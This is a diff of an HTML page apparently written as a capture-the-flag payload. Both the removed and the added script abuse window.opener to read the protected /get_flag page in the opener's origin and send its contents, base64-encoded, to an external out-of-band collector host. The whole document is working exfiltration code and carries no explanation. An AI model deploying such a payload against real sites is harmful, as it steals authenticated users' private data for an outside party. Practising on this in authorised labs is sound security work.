@@ -2,41 +2,15 @@
 <html>
 <body>
 <script>
-(async () => {
-  try {
-    if (!window.opener) return;
-
-    const iframe = window.opener.document.createElement('iframe');
-    iframe.style.display = 'none';
-    iframe.src = '/get_flag';
-
-    window.opener.document.body.appendChild(iframe);
-
-    iframe.onload = async () => {
-      try {
-        const flag = iframe.contentDocument.body.innerText;
-
-        await fetch('https://toetqx9cw60filn7a5fc93hyfph3qlp0w.oast.site/', {
-          method: 'POST',
-          mode: 'no-cors',
-          body: btoa(flag),
-        });
-      } catch (e) {
-        await fetch('https://toetqx9cw60filn7a5fc93hyfph3qlp0w.oast.site/', {
-          method: 'POST',
-          mode: 'no-cors',
-          body: btoa(e.message),
-        });
-      }
-    };
-  } catch (e) {
-    await fetch('https://toetqx9cw60filn7a5fc93hyfph3qlp0w.oast.site/', {
-      method: 'POST',
-      mode: 'no-cors',
-      body: btoa(e.message),
-    });
-  }
-})();
+if (window.opener) {
+  window.opener.eval(`
+    fetch('/get_flag', { credentials: 'include' })
+      .then(r => r.text())
+      .then(flag => {
+        fetch('https://toetqx9cw60filn7a5fc93hyfph3qlp0w.oast.site/?flag=' + btoa(flag), {mode: 'no-cors'});
+      });
+  `);
+}
 </script>
 </body>
 </html>
